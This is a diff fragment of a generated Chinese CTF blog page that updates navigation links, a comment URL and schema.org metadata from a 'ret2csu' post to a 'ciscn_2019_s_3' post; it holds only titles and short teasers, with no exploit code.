-那么我们还有办法自己构建一个后门函数...</p>
+        <a class='next' href='/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/'>
+          <p class='title'>SWPUCTF 2021 新生赛<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>这篇用来记录SWPUCTF 2021 新生赛刷题记录
+gift_F12123456789101112131415161718192021&lt;script language=&quot;jav...</p>
         </a>
       
     </div>
@@ -2606,7 +2604,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/09/25/ret2csu/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/11/14/ciscn-2019-s-3/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -3212,7 +3210,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/09/25/ret2csu/","name":"ret2csu"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ret2csu","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/09/25/ret2csu/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/09/25/ret2csu/","wordCount":0,"datePublished":"2022-09-25T06:47:11.000Z","dateModified":"2022-10-06T08:49:52.546Z","articleSection":"栈","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/wp/","name":"wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/14/ciscn-2019-s-3/","name":"ciscn_2019_s_3"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ciscn_2019_s_3","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/14/ciscn-2019-s-3/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/14/ciscn-2019-s-3/","wordCount":0,"datePublished":"2022-11-14T11:38:19.000Z","dateModified":"2022-11-14T12:19:42.082Z","articleSection":"wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
